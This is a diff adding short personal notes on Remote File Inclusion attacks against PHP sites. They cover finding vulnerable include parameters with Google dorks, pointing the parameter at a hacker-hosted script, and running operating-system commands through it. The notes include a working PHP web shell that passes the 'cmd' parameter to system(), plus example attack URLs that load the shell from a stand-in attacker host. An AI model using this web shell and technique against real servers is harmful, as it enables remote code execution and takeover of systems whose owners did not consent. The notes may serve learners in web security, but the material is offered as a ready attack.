@@ -1,0 +1,29 @@
+Remote File Inclusion
+
+~ allows the attacker to upload a custom coded/malicious file on a website or server
+~ the attacker uses a unvalidated file load to then load files from the hackers site to the the victim site
+~ if a server pull documents then displays them as web content, test for RFI here eg http://victimsite.com/index.php?page=home , here we can see that it is pulling a document named home and displaying it as web content
+~ look for "PHP include function" , as this is what is used to pull the webpages
+
+
+1) Use google dorks to find RFI openings
+eg http://victimsite.com/index.php?page=home 
+
+2) instead of the usual file, enter the url of your website, ie hackers website
+
+eg http://victimsite.com/index.php?page=http://hackersite.com/evilscript.txt 
+
+~ the file evilscript contatin te following php code : 
+
+<?php
+echo "<script>alert(Test Successful !!);</script>";
+echo "Run command: ".htmlspecialchars($_GET['cmd']);
+system($_GET['cmd']);
+?>
+
+~ since it is also using the cmd command, it can try an run arbitury commands on the server, eg pwd and redner it on the web page
+
+~ notice that the file has a txt entension but in the original request it doesnt, this might cause an error such as "failure to include evilscript.txt.txt" , in that case use another hacker page without extension
+
+3) if the above was successfull you can try running commands on the operating system 
+eg  http//victimsite.com/index.php?cmd=pwd&page=http://hackersite.com/ourscript
